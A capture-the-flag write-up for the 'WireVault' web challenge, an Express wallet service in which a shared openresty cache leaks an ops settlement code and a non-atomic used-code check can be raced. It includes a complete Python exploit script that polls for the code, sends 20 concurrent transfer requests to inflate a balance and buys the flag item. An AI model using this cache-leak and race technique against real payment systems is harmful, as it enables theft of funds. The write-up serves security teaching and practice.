---
title: "WireVault"
category: "Web"
tags: ["web", "express", "openresty", "cache-leak", "race-condition", "toctou", "wallet"]
solve_date: "2026-10-26T10:51:50+07:00"
language: "en"
points: 71
---

# WireVault — ops settlement code leaked from cache, then raced

**Flag:** `CTF{8bc0b47d16a341747a384edb8b88afb8}`
**Service:** `http://144.217.91.111:3003`
**Flag format:** `CTF{...}`

## Challenge

> WireVault — 71 points. WireVault is an internal payment/settlement service. There's a wallet that apparently nobody but ops can fund.

The application is an Express wallet with registration, login, a balance, an item shop, and a transfer endpoint. The goal item is `platinum_pass` at 50,000 cents. Only an internal "ops" role can produce the settlement code that funds a wallet.

## Analysis

### Surface

The Express app exposes JSON endpoints:

| Endpoint | Purpose |
|---|---|
| `POST /api/auth/register` | create an account |
| `POST /api/auth/login` | session cookie (`connect.sid`) |
| `GET /api/wallet/balance` | current balance |
| `GET /api/wallet/items` | shop catalogue |
| `POST /api/wallet/buy` | buy an item |
| `POST /api/wallet/transfer` | settle a transfer with an ops `authCode` |
| `GET /api/admin/status` | internal ops status, normally 401 |

A second, internal service sits behind the same openresty instance. The public app never gives a normal user an ops code.

### Leak 1 — cached ops status

`GET /api/admin/status` returns `401 {"error":"unauthorized"}` for a normal session, but openresty caches the successful ops response and does not include the session in the cache key. Polling the endpoint eventually returns a cached `200` with `X-Cache: HIT`:

```json
{"status":"ok","role":"ops","transferAuthCode":"6d30388cfbe78ca85e4b671dd9a34542","expiresInSeconds":300}
```

The code is valid for 300 seconds. A background poller that watches for a fresh `transferAuthCode` and fires immediately is enough.

### Leak 2 — the settlement is raceable

`POST /api/wallet/transfer` requires the logged-in session cookie *and* a valid ops `authCode`. It credits a fixed **5,000 cents per code per account**, regardless of the `amount` field. The "already settled" check is a classic TOCTOU:

1. request A reads "code not yet used for this account";
2. request B reads the same thing before A writes the used marker;
3. both credit 5,000.

Twenty concurrent requests with one fresh code produced 100,000 cents. The code can also be raced on other accounts until it expires; there is no global one-time use.

## Exploit

```python
import concurrent.futures as cf
import re
import requests
import time

BASE = "http://144.217.91.111:3003"
USER, PASS = "u183208552", "pass1234"

s = requests.Session()
s.post(BASE + "/api/auth/register", json={"username": USER, "password": PASS})
s.post(BASE + "/api/auth/login", json={"username": USER, "password": PASS})

# Wait for a fresh cached ops response and grab the settlement code.
code = None
while code is None:
    r = s.get(BASE + "/api/admin/status", headers={"Cache-Control": "no-cache"})
    if r.status_code == 200 and "transferAuthCode" in r.text:
        code = re.search(r'"transferAuthCode":"([a-f0-9]+)"', r.text).group(1)
    else:
        time.sleep(1)

# Race the one-time settlement check before the 300s TTL expires.
cookies = s.cookies.get_dict()

def settle(_):
    ss = requests.Session()
    ss.cookies.update(cookies)
    return ss.post(BASE + "/api/wallet/transfer", json={"authCode": code}).status_code

with cf.ThreadPoolExecutor(max_workers=20) as ex:
    list(ex.map(settle, range(20)))

print(s.get(BASE + "/api/wallet/balance").text)          # balance: 100000
print(s.post(BASE + "/api/wallet/buy", json={"item": "platinum_pass"}).text)
```

The purchase response contains the flag:

```json
{"status":"purchased","item":"platinum_pass","balance":50000,"flag":"CTF{8bc0b47d16a341747a384edb8b88afb8}"}
```

## Notes

- The `amount` and `to` fields in the transfer body are ignored by the settlement service; the credit is a fixed 5,000 per code per account. Supplying `amount: 75000` does not change it.
- The same code works once per account, so a fresh account plus the race is the cheapest route to 50,000.
- The root cause is the combination of two independent mistakes: an auth-bearing response leaking through a shared cache, and a non-atomic "has this code been used" check.
- The ops code had a 300-second lifetime; a code caught near the end of its window was already expired by the time the transfer was attempted, which is why the exploit watches for a fresh one instead of reusing the first observed value.

## References

- Express session cookies and `connect.sid`
- openresty proxy caching (`X-Cache: HIT`)
